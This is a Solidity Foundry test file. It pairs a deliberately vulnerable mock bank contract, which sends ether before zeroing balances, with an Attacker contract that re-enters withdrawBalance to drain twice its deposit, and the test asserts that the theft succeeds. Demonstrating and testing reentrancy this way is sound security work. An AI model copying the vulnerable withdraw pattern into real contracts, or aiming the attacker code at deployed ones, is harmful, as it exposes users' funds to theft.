pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";

contract MockReentrancy {
    mapping(address => uint) public userBalances;
    uint public totalWithdrawals;

    event Deposit(address indexed user, uint amount);
    event Withdrawal(address indexed user, uint amount);

    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function getBalance(address user) public view returns (uint) {
        return userBalances[user];
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        require(amountToWithdraw > 0, "No balance to withdraw");

        totalWithdrawals += amountToWithdraw;

        // Vulnerable call that enables reentrancy
        (bool success, ) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success);
        userBalances[msg.sender] = 0;

        emit Withdrawal(msg.sender, amountToWithdraw);
    }
}

contract ReentrancyAttackTest is Test {
    MockReentrancy victim;
    Attacker attacker;

    function setUp() public {
        victim = new MockReentrancy();
        attacker = new Attacker(address(victim));

        // Fund attacker for deposit
        vm.deal(address(attacker), 1 ether);

        // Attacker deposits 1 ETH into victim
        vm.prank(address(attacker));
        victim.deposit{value: 1 ether}();

        // Test contract deposits 1 ETH to ensure victim has enough funds
        vm.deal(address(this), 1 ether);
        victim.deposit{value: 1 ether}();
    }

    function testReentrancyExploit() public {
        uint initialVictimBalance = address(victim).balance;
        uint initialAttackerBalance = address(attacker).balance;

        // Execute attack - should withdraw twice (2 ETH total)
        attacker.attack();

        // Verify victim lost 2 ETH
        assertEq(address(victim).balance, initialVictimBalance - 2 ether, "Victim balance incorrect");
        // Verify attacker gained 2 ETH
        assertEq(address(attacker).balance, initialAttackerBalance + 2 ether, "Attacker balance incorrect");
        // Verify victim's accounting shows zero balance for attacker
        assertEq(victim.getBalance(address(attacker)), 0, "Attacker balance not zeroed");
    }
}

contract Attacker {
    MockReentrancy victim;
    uint256 private reentrancyCount;

    constructor(address _victim) {
        victim = MockReentrancy(_victim);
    }

    function attack() public {
        // Initiate first withdrawal
        victim.withdrawBalance();
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            // Reenter during first withdrawal
            victim.withdrawBalance();
        }
    }
}
